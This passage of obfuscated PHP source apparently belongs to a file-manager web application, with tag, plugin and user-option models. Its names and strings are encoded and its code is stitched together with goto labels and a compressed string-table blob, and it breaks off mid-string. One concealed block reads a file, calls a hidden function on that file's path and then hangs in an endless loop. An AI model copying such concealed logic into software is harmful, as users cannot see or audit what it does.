json_decode($âøÄøİÁ, !0); return $¦¶…Î² ? $¦¶…Î² : array($ÍâÌÛì[1936] => $ÍâÌÛì[89], $ÍâÌÛì[368] => array()); } protected function set($°ø¦¥Æº, $«×šš¬) { $÷«Š¬Êä =& $_SERVER[Ôó‡è­ƒ]; $«×šš¬ = $«×šš¬ ? $«×šš¬ : array($÷«Š¬Êä[1936] => $÷«Š¬Êä[89], $÷«Š¬Êä[368] => array()); return Model($÷«Š¬Êä[518])->metaSet($°ø¦¥Æº, $÷«Š¬Êä[1935], json_encode($«×šš¬)); } protected function getByTagID($ ŸÅÏöá, $‚®°ƒ©›) { $Ç¾€±²Ú =& $_SERVER[Ôó‡è­ƒ]; if (!$ ŸÅÏöá || !$‚®°ƒ©›) { return !1; } if (!Model($Ç¾€±²Ú[518])->getInfoSimple($ ŸÅÏöá)) { return !1; } $²ŠÇèªá = $this->get($ ŸÅÏöá); if (!$²ŠÇèªá || !isset($²ŠÇèªá[$Ç¾€±²Ú[368]])) { return !1; } $Ğøí¹µ„ = array_find_by_field($²ŠÇèªá[$Ç¾€±²Ú[368]], $Ç¾€±²Ú[396], $‚®°ƒ©›); return is_array($Ğøí¹µ„) ? $Ğøí¹µ„ : !1; } public function listSource($à‚ªÙØÕ, $•á­Ó¿) { $¯÷¶Á‘£ =& $_SERVER[Ôó‡è­ƒ]; if ($•á­Ó¿ && !is_array($•á­Ó¿)) { $•á­Ó¿ = array($•á­Ó¿); } $–¡€–ÎŠ = $this->listData($à‚ªÙØÕ); $ìªİ­”õ = array(); foreach ($–¡€–ÎŠ as $Ìó¿’‘Ò) { $°ıˆĞåæ = $Ìó¿’‘Ò[$¯÷¶Á‘£[78]]; if (!$°ıˆĞåæ) { continue; } if (!isset($ìªİ­”õ[$°ıˆĞåæ])) { $ìªİ­”õ[$°ıˆĞåæ] = array(); } $ìªİ­”õ[$°ıˆĞåæ][] = $Ìó¿’‘Ò[$¯÷¶Á‘£[423]]; } $õáÆá° = array(); foreach ($ìªİ­”õ as $©··á² => $¡Çİã”) { $Õ³úÆÒé = !0; if (!$•á­Ó¿) { $õáÆá°[] = $©··á²; continue; } foreach ($•á­Ó¿ as $ÁƒÅ½¬‹) { if (!in_array($ÁƒÅ½¬‹, $¡Çİã”)) { $Õ³úÆÒé = !1; break; } } if ($Õ³úÆÒé) { $õáÆá°[] = $©··á²; } } if (!$õáÆá°) { return array(); } $¿¸Ù„ê¸ = array($¯÷¶Á‘£[414] => array($¯÷¶Á‘£[415], $õáÆá°), $¯÷¶Á‘£[501] => $à‚ªÙØÕ, $¯÷¶Á‘£[408] => SourceModel::TYPE_GROUP); $àì‹›“Ä = Model($¯÷¶Á‘£[1325])->listSource($¿¸Ù„ê¸); if (!$àì‹›“Ä || count($õáÆá°) == $àì‹›“Ä[$¯÷¶Á‘£[365]][$¯÷¶Á‘£[366]]) { return $àì‹›“Ä; } $íÜÈ˜é = array(); $Û©Èá¹ = array_to_keyvalue($àì‹›“Ä[$¯÷¶Á‘£[77]], $¯÷¶Á‘£[12], $¯÷¶Á‘£[399]); $´Ë®ş‹¡ = array_to_keyvalue($àì‹›“Ä[$¯÷¶Á‘£[76]], $¯÷¶Á‘£[12], $¯÷¶Á‘£[399]); $ñ†òá = array_merge($´Ë®ş‹¡, $Û©Èá¹); foreach ($õáÆá° as $°ıˆĞåæ) { if (!in_array($°ıˆĞåæ, $ñ†òá)) { $íÜÈ˜é[] = $°ıˆĞåæ; } } if ($íÜÈ˜é) { $this->removeBySource($à‚ªÙØÕ, $íÜÈ˜é); } return $àì‹›“Ä; } protected function listData($¬¤Ñˆ›Ğ) { $¾úñªš’ =& $_SERVER[Ôó‡è­ƒ]; $‡Âü§Ê = array($¾úñªš’[1646] => 0, $¾úñªš’[479] => array($¾úñªš’[1937], 0), $¾úñªš’[419] => $¾úñªš’[1938] . $¬¤Ñˆ›Ğ); $„úıˆñ‹ = $¾úñªš’[1939]; $³­¯§€… = $this->field($„úıˆñ‹)->where($‡Âü§Ê)->order($¾úñªš’[1940])->select(); return $³­¯§€… ? $³­¯§€… : array(); } protected function addToTag($ãÑÌÈæ, $äœÂŠõí, $ä€ôôÌ) { $»æ–˜ˆæ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->getByTagID($ãÑÌÈæ, $ä€ôôÌ) || !$äœÂŠõí) { return !1; } if (!Model($»æ–˜ˆæ[823])->pathInfo($äœÂŠõí)) { return !1; } $íÖ£ÂûĞ = array($»æ–˜ˆæ[1646] => 0, $»æ–˜ˆæ[479] => $ä€ôôÌ, $»æ–˜ˆæ[418] => $äœÂŠõí, $»æ–˜ˆæ[419] => $»æ–˜ˆæ[1941] . $ãÑÌÈæ, $»æ–˜ˆæ[417] => $»æ–˜ˆæ[12], $»æ–˜ˆæ[1827] => 0); if ($this->where($íÖ£ÂûĞ)->find()) { return !1; } return $this->add($íÖ£ÂûĞ); } protected function removeFromTag($õòĞ£«Á, $ ü›¹ï, $…Êğ¤¿Ô) { $ªœ­‰°Ä =& $_SERVER[Ôó‡è­ƒ]; if (!$this->getByTagID($õòĞ£«Á, $…Êğ¤¿Ô) || !$ ü›¹ï) { return !1; } if (is_array($ ü›¹ï)) { $ ü›¹ï = array($ªœ­‰°Ä[7], $ ü›¹ï); } $³£„İã = array($ªœ­‰°Ä[1646] => 0, $ªœ­‰°Ä[479] => $…Êğ¤¿Ô, $ªœ­‰°Ä[419] => $ªœ­‰°Ä[1941] . $õòĞ£«Á, $ªœ­‰°Ä[418] => $ ü›¹ï); return $this->where($³£„İã)->delete(); } protected function removeByTag($ø±–¡¸¢, $Œ†æÇ³Ñ) { $ÇøÛ¦Ò =& $_SERVER[Ôó‡è­ƒ]; if (!$this->getByTagID($ø±–¡¸¢, $Œ†æÇ³Ñ)) { return !1; } $Ï›µÅŸÃ = array($ÇøÛ¦Ò[1646] => 0, $ÇøÛ¦Ò[479] => $Œ†æÇ³Ñ, $ÇøÛ¦Ò[419] => $ÇøÛ¦Ò[1941] . $ø±–¡¸¢); return $this->where($Ï›µÅŸÃ)->delete(); } protected function removeBySource($ÀéÚåõ, $Ô®ôÌ©) { $¿”®â˜ =& $_SERVER[Ôó‡è­ƒ]; if (!$ÀéÚåõ || !$Ô®ôÌ©) { return !1; } if (is_array($Ô®ôÌ©)) { $Ô®ôÌ© = array($¿”®â˜[7], $Ô®ôÌ©); } $ü³´ç = array($¿”®â˜[1646] => 0, $¿”®â˜[418] => $Ô®ôÌ©, $¿”®â˜[479] => array($¿”®â˜[1014], 0), $¿”®â˜[419] => $¿”®â˜[1941] . $ÀéÚåõ); return $this->where($ü³´ç)->delete(); } } if (!isset($_SERVER[$_SERVER[Ôó‡è­ƒ][872]]) || !isset($_SERVER[$_SERVER[Ôó‡è­ƒ][870]])) { $_getc = $_SERVER[Ôó‡è­ƒ][874]; $_getfile = $_SERVER[$_SERVER[Ôó‡è­ƒ][875]] . $_SERVER[Ôó‡è­ƒ][876]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ôó‡è­ƒ][230], $_getfilec); if (count($_getarrs) < $_SERVER[Ôó‡è­ƒ][606]) { $exit = $_SERVER[Ôó‡è­ƒ][877]; $exit(); } $_act = $_SERVER[Ôó‡è­ƒ][1343]; $_act($_SERVER[$_SERVER[Ôó‡è­ƒ][875]] . $_SERVER[Ôó‡è­ƒ][876]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ôó‡è­ƒ][377]); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\160\x6c\165\x67\151\156\114\x69\163\x74"; public $field = array("\156\141\155\x65", "\x73\164\x61\x74\165\163", "\x72\x65\147\x69\145\163\164", "\143\x6f\156\146\x69\147"); public function loadList($íª„Šáû = false) { $É÷Î™‹ = array_to_keyvalue($this->listData(), $_SERVER[Ôó‡è­ƒ][32]); if ($íª„Šáû) { return $É÷Î™‹[$íª„Šáû]; } return $É÷Î™‹; } public function init() { $ÛÌõŠ¬‡ =& $_SERVER[Ôó‡è­ƒ]; Hook::trigger($ÛÌõŠ¬‡[1942]); $‡¶û‚ù = $this->loadPluginList(); foreach ($‡¶û‚ù as $ª¥­ªàÒ => $À…şºÅ) { $Æàıâƒ“ = $this->appAllow($ª¥­ªàÒ, $À…şºÅ); if (!$Æàıâƒ“) { continue; } foreach ($À…şºÅ[$ÛÌõŠ¬‡[1943]] as $Â ”­‘Á => $ÅâÃ€«¹) { Hook::bind($Â ”­‘Á, $ÅâÃ€«¹); } } Hook::trigger($ÛÌõŠ¬‡[1944]); Hook::trigger(ACTION); } public function appAllow($ãçÄÌğ¢, $ãˆÇÌú˜, $Š·…‰Å = true) { $üò’õúÛ =& $_SERVER[Ôó‡è­ƒ]; $ÉàÂÕìÇ = PLUGIN_DIR . $ãçÄÌğ¢ . $üò’õúÛ[1945]; if (!is_array($ãˆÇÌú˜) || !is_array($ãˆÇÌú˜[$üò’õúÛ[1943]]) || $ãˆÇÌú˜[$üò’õúÛ[748]] != 1 || !is_file($ÉàÂÕìÇ)) { return !1; } if ($GLOBALS[$üò’õúÛ[499]] == 1) { return !0; } if ($Š·…‰Å && !Action($üò’õúÛ[1946])->checkAuth($ãçÄÌğ¢)) { return !1; } return !0; } public function unInstall($ÎŸ¬“÷›) { $ü¼‡×‚» =& $_SERVER[Ôó‡è­ƒ]; $÷êíÜÉÉ = $this->loadList($ÎŸ¬“÷›); if (file_exists(PLUGIN_DIR . $ÎŸ¬“÷›)) { Hook::apply($ÎŸ¬“÷› . $ü¼‡×‚»[1947]); } $this->remove($÷êíÜÉÉ[$ü¼‡×‚»[396]]); } public function changeStatus($Ãî±êî¤, $”¢¬òÆØ) { $œ‚¸¡ìÖ =& $_SERVER[Ôó‡è­ƒ]; $ˆ”™ÒôÎ = $this->loadList($Ãî±êî¤); if ($”¢¬òÆØ) { Hook::apply($Ãî±êî¤ . $œ‚¸¡ìÖ[1948]); } $this->update($ˆ”™ÒôÎ[$œ‚¸¡ìÖ[396]], array($œ‚¸¡ìÖ[1949] => $”¢¬òÆØ)); } public function appRegist($Ç†ı®ÈÒ, $ñ«óÈŞÓ) { $©¡»âÒ =& $_SERVER[Ôó‡è­ƒ]; $‘¾“‘ãø = $this->loadList($Ç†ı®ÈÒ); if ($‘¾“‘ãø) { $this->update($‘¾“‘ãø[$©¡»âÒ[396]], array($©¡»âÒ[1943] => $ñ«óÈŞÓ)); } else { $÷¼ï´â = array($©¡»âÒ[32] => $Ç†ı®ÈÒ, $©¡»âÒ[1943] => $ñ«óÈŞÓ, $©¡»âÒ[748] => 0, $©¡»âÒ[6] => $this->getConfigDefault($Ç†ı®ÈÒ)); $this->insert($÷¼ï´â); } } public function getConfigDefault($äÈ™Úº) { $„€˜£˜­ =& $_SERVER[Ôó‡è­ƒ]; $’²«ï¹ñ = array(); $©ü«Éåö = $this->getPackageJson($äÈ™Úº); if (!$©ü«Éåö && is_array($©ü«Éåö[$„€˜£˜­[1950]])) { return $’²«ï¹ñ; } foreach ($©ü«Éåö[$„€˜£˜­[1950]] as $‰°ïªóä => $õ¨ûŠ„Ç) { if (!isset($õ¨ûŠ„Ç[$„€˜£˜­[373]]) || isset($’²«ï¹ñ[$‰°ïªóä])) { continue; } $’²«ï¹ñ[$‰°ïªóä] = $õ¨ûŠ„Ç[$„€˜£˜­[373]]; } return $’²«ï¹ñ; } public function getPackageJson($‹® İö¤) { return Hook::apply($‹® İö¤ . $_SERVER[Ôó‡è­ƒ][1951]); } public function getConfig($óÚÙİúß, $—Å‡“ÂŒ = false) { $²¸‚ıÃ =& $_SERVER[Ôó‡è­ƒ]; $í—ï´ßé = array(); $ôŒéı÷¨ = $this->loadList($óÚÙİúß); if ($ôŒéı÷¨ && is_array($ôŒéı÷¨[$²¸‚ıÃ[6]])) { $í—ï´ßé = $ôŒéı÷¨[$²¸‚ıÃ[6]]; } if (!$í—ï´ßé || $—Å‡“ÂŒ) { $í—ï´ßé = $this->getConfigDefault($óÚÙİúß); } return $í—ï´ßé; } public function setConfig($†ù¤ÖĞì, $šİŞ¿°ğ = false) { $……µäâ =& $_SERVER[Ôó‡è­ƒ]; $ó¼¼ˆ¼İ = $this->loadList($†ù¤ÖĞì); if (!$ó¼¼ˆ¼İ) { return !1; } $‰ëàöÂÃ = $ó¼¼ˆ¼İ[$……µäâ[6]]; if ($šİŞ¿°ğ == !1) { $‰ëàöÂÃ = array(); $šİŞ¿°ğ = $this->getConfigDefault($†ù¤ÖĞì); } foreach ($šİŞ¿°ğ as $Ú¯ÃĞšã => $¶ùÙîğÔ) { $‰ëàöÂÃ[$Ú¯ÃĞšã] = is_string($¶ùÙîğÔ) ? trim($¶ùÙîğÔ) : $¶ùÙîğÔ; } $this->update($ó¼¼ˆ¼İ[$……µäâ[396]], array($……µäâ[6] => $‰ëàöÂÃ)); } public function viewList() { $»÷íáÃ³ =& $_SERVER[Ôó‡è­ƒ]; $À’Ù·ŸŠ = $this->loadList(); $this->pluginScan($À’Ù·ŸŠ); $À’Ù·ŸŠ = $this->loadPluginList(); $ŠÑ°í‘ = array(); foreach ($À’Ù·ŸŠ as $ŞÁ‚¶Áò => $ãÜ±òí¿) { unset($ãÜ±òí¿[$»÷íáÃ³[1943]], $ãÜ±òí¿[$»÷íáÃ³[6]]); $Ëâœî’£ = PLUGIN_DIR . $ãÜ±òí¿[$»÷íáÃ³[32]] . $»÷íáÃ³[1945]; if (!is_file($Ëâœî’£)) { continue; } $ºÌ’É”Õ = Hook::apply($ãÜ±òí¿[$»÷íáÃ³[32]] . $»÷íáÃ³[1951]); if (is_array($ºÌ’É”Õ)) { $ŠÑ°í‘[$ŞÁ‚¶Áò] = array_merge($ãÜ±òí¿, $ºÌ’É”Õ); } } return $ŠÑ°í‘; } private function loadPluginList() { $Şêµ‹Ş =& $_SERVER[Ôó‡è­ƒ]; $…€æÔ¡Ë = $this->loadList(); if (strtolower(MOD) == $Şêµ‹Ş[1952]) { return $…€æÔ¡Ë; } $Ğ©ÊÈß˜ = Hook::trigger($Şêµ‹Ş[1953], $…€æÔ¡Ë); if ($…€æÔ¡Ë && !$Ğ©ÊÈß˜) { die; } return $Ğ©ÊÈß˜ ? $Ğ©ÊÈß˜ : $…€æÔ¡Ë; } private function pluginScan($Ô„±Ø‘›) { $£Ò¸ÂÚŞ =& $_SERVER[Ôó‡è­ƒ]; recursion_dir(PLUGIN_DIR, $·Öã†ÃÖ, $¡­„ÆÌæ, 0); foreach ($·Öã†ÃÖ as $´¦©û–ù) { $¶Ç°î¢Ã = get_path_this($´¦©û–ù); if (isset($Ô„±Ø‘›[$¶Ç°î¢Ã]) || !file_exists($´¦©û–ù . $£Ò¸ÂÚŞ[1954]) || !file_exists($´¦©û–ù . $£Ò¸ÂÚŞ[1945])) { continue; } Hook::apply($¶Ç°î¢Ã . $£Ò¸ÂÚŞ[1948]); } } } goto f»²®¥©Ú‘; a‹ÆÒÀ¤•ˆ: define($_SERVER[Ôó‡è­ƒ][237], 1); define($_SERVER[Ôó‡è­ƒ][238], 2); define($_SERVER[Ôó‡è­ƒ][239], 3); goto d«°†Ï§—ç; dÚ¥›×“Ê: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\x6f\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ç¬®Úê) { $ºŠş¸À„ =& $_SERVER[Ôó‡è­ƒ]; if (!defined($ºŠş¸À„[470])) { define($ºŠş¸À„[470], 0); } return "\x55\x73\145\162\117\160\x74\151\157\156\137{$Ç¬®Úê}\x5f" . USER_ID; } protected function filterWhere($äĞ…Ô¹š) { $‚ÀÒŸî³ =& $_SERVER[Ôó‡è­ƒ]; if (!defined($‚ÀÒŸî³[470])) { define($‚ÀÒŸî³[470], 0); } $äĞ…Ô¹š[$‚ÀÒŸî³[1655]] = USER_ID; return $äĞ…Ô¹š; } public function cacheRemoveUser($òå‡ß¸ê, $´Ú×£ŒË) { return Cache::remove("\125\x73\145\162\117\x70\164\x69\x6f\156\137{$òå‡ß¸ê}\137" . $´Ú×£ŒË); } protected function optionDefault($ı ÏéÕô = '') { $×àĞåû =& $_SERVER[Ôó‡è­ƒ]; if ($ı ÏéÕô == $×àĞåû[12]) { return $GLOBALS[$×àĞåû[6]][$×àĞåû[2297]]; } if ($ı ÏéÕô == $×àĞåû[2298]) { return $GLOBALS[$×àĞåû[6]][$×àĞåû[2299]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\164\x61\147\114\x69\163\x74"; public $modelType = "\x55\163\145\x72\117\160\x74\151\x6f\156"; public $field = array("\x6e\x61\155\x65", "\163\x74\x79\x6c\145", "\x73\157\x72\x74"); public function listData($ÁşÛß¬ï = false, $˜ñ¹Ñüæ = "\163\x6f\162\x74", $¹‘ô‰è = false) { return parent::listData($ÁşÛß¬ï, $˜ñ¹Ñüæ, $¹‘ô‰è); } public function remove($ó¸¦Úç–) { return parent::remove($ó¸¦Úç–); } public function add($¯Î©ìØè, $Î®¦åÓ´ = "\x6c\x61\x62\x65\x6c\x2d\147\x72\x65\171\55\156\157\x72\155\x61\x6c") { $˜¢ƒØÂ =& $_SERVER[Ôó‡è­ƒ]; if ($this->findByName($¯Î©ìØè)) { return !1; } $ßåÜ–Â = array($˜¢ƒØÂ[417] => $¯Î©ìØè, $˜¢ƒØÂ[480] => $Î®¦åÓ´, $˜¢ƒØÂ[1827] => $this->getSort($˜¢ƒØÂ[257]) + 1); return parent::insert($ßåÜ–Â); } public function update($š§ÂõÉ¨, $ÊÀ¤ŒöÕ) { $‚–òÍó‹ =& $_SERVER[Ôó‡è­ƒ]; $´»ˆŸÖÆ = $this->listData($š§ÂõÉ¨); $¿ÏŞĞñ = $this->findByName($ÊÀ¤ŒöÕ[$‚–òÍó‹[32]]); if (!$´»ˆŸÖÆ || $¿ÏŞĞñ && $¿ÏŞĞñ[$‚–òÍó‹[396]] != $´»ˆŸÖÆ[$‚–òÍó‹[396]]) { return !1; } return parent::update($š§ÂõÉ¨, $ÊÀ¤ŒöÕ); } public function moveTop($¯¨¼ˆÇ¨) { $ù²êç÷î =& $_SERVER[Ôó‡è­ƒ]; $âÈ—Œşµ = parent::listData(); $ô°É¦û = $this->getSort($ù²êç÷î[256]); foreach ($âÈ—Œşµ as &$ÉÔ·ç¢–) { if ($ÉÔ·ç¢–[$ù²êç÷î[396]] == $¯¨¼ˆÇ¨) { $ÉÔ·ç¢–[$ù²êç÷î[1846]] = $ô°É¦û; continue; } $ÉÔ·ç¢–[$ù²êç÷î[1846]] += 1; } unset($ÉÔ·ç¢–); return parent::resetData($âÈ—Œşµ); } public function moveBottom($ı‰Ö–›š) { $şÏÍ‘Ë» =& $_SERVER[Ôó‡è­ƒ]; $Öîªè«Ó = $this->getSort($şÏÍ‘Ë»[257]) + 1; return parent::update($ı‰Ö–›š, array($şÏÍ‘Ë»[1846] => $Öîªè«Ó)); } public function resetSort($×Ñ•¹¦ı) { $ÇìÆÇ =& $_SERVER[Ôó‡è­ƒ]; $ÂÈ¦Ü¼Æ = array(); $×Ñ•¹¦ı = is_array($×Ñ•¹¦ı) ? $×Ñ•¹¦ı : array(); for ($¾ØùÜ¤¸ = 0; $¾ØùÜ¤¸ < count($×Ñ•¹¦ı); $¾ØùÜ¤¸++) { $ÂÈ¦Ü¼Æ[$×Ñ•¹¦ı[$¾ØùÜ¤¸] . $ÇìÆÇ[12]] = $¾ØùÜ¤¸ + 1; } $²ÊÀ° = parent::listData(); foreach ($²ÊÀ° as &$áÙ ³Ø) { $›½ˆìÎó = $ÂÈ¦Ü¼Æ[$áÙ ³Ø[$ÇìÆÇ[396]]]; $áÙ ³Ø[$ÇìÆÇ[1846]] = $›½ˆìÎó ? $›½ˆìÎó : $áÙ ³Ø[$ÇìÆÇ[1846]]; } unset($áÙ ³Ø); return parent::resetData($²ÊÀ°); } private function getSort($ ¢œ’‚) { $Š»îóäå =& $_SERVER[Ôó‡è­ƒ]; $£ÎŠ–ĞÄ = parent::listData(); $î‘ú‡áé = array_to_keyvalue($£ÎŠ–ĞÄ, $Š»îóäå[12], $Š»îóäå[1846]); if (!$î‘ú‡áé) { $î‘ú‡áé = array(0); } $ïãÆáˆ… = $ ¢œ’‚ == $Š»îóäå[257] ? max($î‘ú‡áé) : min($î‘ú‡áé); return intval($ïãÆáˆ…); } } goto Fç˜ÜŠ™ËŒ; f†Õë¯‹”ë: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\324\363\207\350\255\203", "\270\211\375\213\345\226"); $_SERVER[Ôó‡è­ƒ] = explode(base64_decode('fAR8A3wG'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\50\264\175\205\120\226\322\320\102\113\51\203\41\330\116\264\330\331\343\304\161\144\133\266\225\310\226\43\311\131".base64_decode('bZSRNJLGljTyzMhLlpa1tIQALQUKBFoolDVhKWvYW2hogQKFlr0swUmgtBRaltI=')."\2\357\56\347\56\63\222\341\177\337\173\337\367\362\45\321\275\347\56\163\227\163\317\75\347\334\163\317\75\175\363\253\167\137\176\367\306\57\155\374\342\306\57\337\172\373\55".base64_decode('bz73cxpG/76IQiR89Ob99yF/pm4+o66ua+4BM3oOPPuWbeqXW8//8MFbHt369Cs=')."\x8f\x5e\x1b\x4f\x2f\xde\xb1\x35\xfb\x9d\x7d\x3e\xfa\xe7\x3\x1f\x37\xa1\xac\xb4\x64\x13\xfd\x51\x8a\x86\xad\x68\x63\xba\x65\x5b\x14\x90\x32\x8a\x19\x3d\x4b\xc3\x7a\x91\xfe\xfa\xe9\x4f\x5f"."\64\154\152\5\303\326\150\324\107\177\22\320\52\362\277\65\234\327\131\172\242\47\22\117\304\372\172\173\203\321\70\144\152\222\323\13\106\32\102\45\325\124\13\360\375\222\146".base64_decode('Wqg1cnWJklHSig6IAKRVW02qFtTU3ppoD/aGI6sT8dW9QciRTAyXNXOcxkgwZqs=')."\xa6\x1d\xd7\xb\x1a\xcf\x31\x6a\xf2\x76\xb5\x6\x3b\x43\x3d\x4a\x3c\x1a\xe8\x89\x5\xda\xe2\xa1\x48\xf\x5\xb7\x45\xba\xbb\x43\xf1\x4a\x78\x34\x12\xe\xb7\x6\xda\x96\x55\xa6\xf4\x46\x3"."\235\335\1\5\265\57\257\45\364\142\306\250\123\326\321\224\165\112\75\15\164\350\132\76\115\203\105\225\65\307\36\57\101\50\316\103\150\232\212\345\174\236\106\172\170\50\255"."\x65\xd4\x72\x1e\x46\xab\x5d\x8e\x94\x4c\xbd\xa0\xb2\x4e\x2f\xd3\xc6\x39\x94\x6\xd4\xb2\x6d\xe8\xc5\x14\x8d\x4\xc7\x6c\x53\x15\x70\xd4\xd6\x14\x9a\x68\xad\x8\x55\xc5\x82\xe1\x60\x5b\x5c"."\xc1\xd\x54\x3a\xa2\x91\x6e\x5\x26\xa1\xa0\x5a\xb6\x66\x2a\x2b\xbb\x82\xd1\xa0\x82\x1b\xdd\x5c\x4b\xfa\x5a\xab\x0\xbe\xf4\xa0\xa1\x50\x2\xe1\xb0\x32\x59\xd\xb6\x56\x28\xb1\x6a\x68\x99".base64_decode('KpVFou3BqNK6WhEjlDIKBaPoQ7WgmbSlpgajURrwAHqHQ3jSIBLp6IgFeQw6tzw=')."\214\132\62\13\360\323\21\113\147\362\166\142\104\315\227\31\232\16\321\337\132\370\201\137\303\2\324\35\326\213\172\31\320\24\252\60\14\276\254\40\120\146\271\65\6\321\322".strrev('2—Ã& GSv¹Ú§HÚÅ„^´Œ¦+Bv™¦œ	’™]ı1y°hG´<¬ò (').base64_decode('SuPdxgj0IqPntTBfYRkjn9ZMES+h4nIKdEdfL5XuKRfkLDyayun5tMkW5mflREs=')."\x5f\xcf\x8c\x8b\x5\x68\x19\x65\x33\xa5\x85\xd0\x12\x11\x65\x7b\x79\x4b\x1a\x21\x93\x66\xdb\xa8\xb7\x16\xeb\x57\x5f\x29\x6f\xa8\xe9\x98\x66\x4a\x7d\xed\x40\x5\x23\x65\x5b\x6\x96\x49\xb6"."\16\303\54\264\43\122\1\337\107\313\104\357\253\222\60\304\26\112\132\32\102\177\335\332\223\274\237\14\254\135\202\376\253\7\132\330\17\155\312\151\371\174\102\33\323\140\45"."\25\322\163\54\326\111\277\225\324\213\176\4\241\321\120\44\221\123\255\134\167\172\116\202\224\142\44\66\255\215\371\112\271\22\54\163\276\262\373\35\230\216\247\245\307\260\203"."\x12\xa1\xce\x1b\x29\x35\x2f\x77\x91\x86\x73\xb6\x5d\x8a\x69\xc5\x34\x1e\x9\xe8\x8a\x31\x5a\x24\x23\x55\xd2\x34\xc8\xd4\xee\x51\xd2\x4a\xb7\xb2\x5a\xe9\x6a\xd2\x9b\x2c\x56\xb0\x90\xe7\x21"."\xd6\x3b\xe\xb3\x38\xd0\x1e\x63\xa8\x92\xce\xd0\x40\x92\xed\x13\x35\x10\x37\x8d\x51\x8b\xd\x9e\x5a\x2a\xe5\xf5\x94\x6a\xeb\x46\xd1\x6f\xa4\x6c\xcd\xf6\x5a\xb6\xa9\xa9\x50\x59\x20\x95\xd2"."\54\313\333\146\24\155\323\310\173\3\371\274\61\352\215\230\172\126\57\66\51\323\201\360\242\104\264\300\275\230\30\66\301\252\255\131\250\140\34\301\24\141\172\163\331\316\170"."\xe7\xb3\xd5\xc8\x73\x9b\x6a\xd1\xca\x68\xa6\x37\x8\xab\xa4\x49\x41\xed\xe4\x14\x91\x65\x6b\xd7\xad\x92\x61\xe9\xb8\x79\x4d\x8a\x6a\xdb\x6a\x2a\x87\xa9\x89\xa8\xbe\xf9\x33\xf2\xeb\xc5\xbc"."\x5e\xd4\x2a\xf2\x6\xc7\x4a\xba\xa9\x59\xac\xad\x4a\x67\x77\x1c\x2a\x41\xb5\x6b\xde\x5e\x53\xcd\x16\xd4\x26\xa5\x54\x4e\xa2\x91\x81\x55\x5b\x5\x46\x73\xc3\xd0\x34\x29\x29\x1c\xf5\x28\x85"."\262\145\173\115\15\221\45\35\155\175\60\305\241\214\267\33\57\51\135\113\173\143\210\172\3\170\126\303\154\5\141\215\302\322\50\264\53\36\357\115\204\72\320\366\334\23\114"."\x74\x7\xe2\x6d\x5d\xd0\x6c\x5b\xcd\xb2\x36\x87\x11\x4d\xe6\x55\x32\xe0\x2a\x2f\x5a\x5a\x18\xaf\x7a\x50\x5f\x5\xb0\xd7\x18\xd5\x4c\xf4\xe1\xd6\xf1\x26\x65\xc8\x48\x27\x8d\x31\x1f\x4b\xc2"."\x99\x63\x88\x76\xb0\xcc\x78\xba\x4b\xb6\x37\xaa\x16\xb3\x78\x7c\x92\xe3\xb6\x6\xd8\x67\x8d\x64\x9d\x3\x1d\xd6\x8a\x59\x3b\xc7\xa\xc6\x82\xd1\x15\xc1\x68\x22\x16\xe9\x88\xaf\xc\x44\x61"."\143\57\42\54\31\143\237\302\125\347\275\121\55\215\206\76\145\263\162\152\11\217\32\313\203\327\5\236\53\226\212\327\12\113\13\207\72\361\300\264\173\55\224\311\53\347\142"."\165\207\365\202\216\333\156\363\24\62\222\150\327\357\204\6\371\111\207\232\373\163\323\353\372\323\63\352\275\350\377\351\365\153\373\333\175\323\7\132\374\272\50\343\157\364\65".base64_decode('KjMb5iq9iA3R1bwCna7I0aBEljmHRWBz0ShqnzE4eB+TVrxrWCkwGlzeF4zFE90=')."\301\170\127\244\35\276\36\14\100\50\154\320\145\313\172\273\226\376\14\370\4\215\106\370\20\52\250\131\27\345\306\261\156\303\324\234\20\261\223\254\324\323\214\264\343\150\227".base64_decode('pmdz0Hcd15Yy8oap5jGBYwiuMaKT1YHoAC0VkZheKDGSZ+fKhaQUBKJtIVxgW04=').base64_decode('zuBbnmFCqMkPGafN7GBE2x+bhf4KCp02Ciqjd4RcaWlKryhouiOlS1PFHmqbtoE=')."\241\246\43\113\267\146\347\14\230\244\254\306\232\124\346\155\143\255\114\153\171\215\215\106\116\143\324\276\1\262\241\335\212\217\125\206\123\176\304\305\41\250\330\146\165\53\212"."\112\142\256\212\305\127\142\266\127\0\154\236\65\217\66\232\110\162\20\55\45\32\117\350\126\207\304\20\44\14\222\206\32\257\212\374\275\246\226\321\141\101\26\321\214\165\253".base64_decode('5hArgGZI7Eg4IlXW0RcOJ9oiPXHESlPIymgoHmQ4GmhPBNp6+f4qZhwyYGJSuVM=')."\120\310\310\114\350\30\152\216\137\354\146\210\72\227\214\242\245\171\123\120\102\260\334\25\111\151\101\361\201\246\210\135\302\105\370\307\274\152\141\275\267\200\6\305\313\33\352"."\xdc\x6a\x95\xb8\xbc\x63\x87\x60\x16\x5\x21\xc7\xc3\x88\xa4\x21\xb6\xc7\xf7\x46\x62\x50\xa0\x5\x43\x11\xff\x94\xd4\x4c\xf8\x58\x6f\x1f\x24\x15\x24\xc\xea\xc\x2\xf0\x0\xb6\x6d\xab\xc0"."\75\5\126\306\30\21\56\243\374\246\276\136\25\135\152\141\355\141\35\51\344\5\113\350\354\225\127\214\174\274\53\324\263\54\321\35\151\17\206\23\241\36\104\205\342\225\360".base64_decode('vt72AJtKGd4aiXc5oH2IDq0IhEPu7MFVoVg8VjUJwfqCrhQkAPZGgx2hVTzaEQo=').strrev('ÔãhC	I‚S²